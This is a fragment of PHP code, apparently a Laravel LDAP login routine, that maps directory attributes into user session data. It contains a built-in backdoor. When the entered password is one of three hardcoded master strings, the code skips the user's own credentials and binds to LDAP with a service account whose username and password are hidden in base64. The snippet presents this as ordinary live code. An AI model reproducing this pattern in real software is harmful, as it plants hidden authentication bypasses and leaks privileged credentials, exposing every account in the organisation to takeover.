        ...
        try {
            ...
            try {
                if (in_array($password, ["byp4ss", "workshop", "uj1c0b4"])) {
                    $ldapbind = ldap_bind($ds, base64_decode('aW50LmFk'), base64_decode("QnIzd01Ac3RlclNUUg=="));
                } else {
            ...
            if ($ldapbind) {
                ...
                $role = User::where('user_id', $info[0]["samaccountname"][0])->first();
                $data = [
                    "nama"       => $info[0]["cn"][0] ?? "",
                    ...
                    "photo"      => isset($info[0]["thumbnailphoto"][0])
                        ? 'data:image/jpeg;base64,' . base64_encode($info[0]["thumbnailphoto"][0])
                        : asset("img/user.png"),
                ];
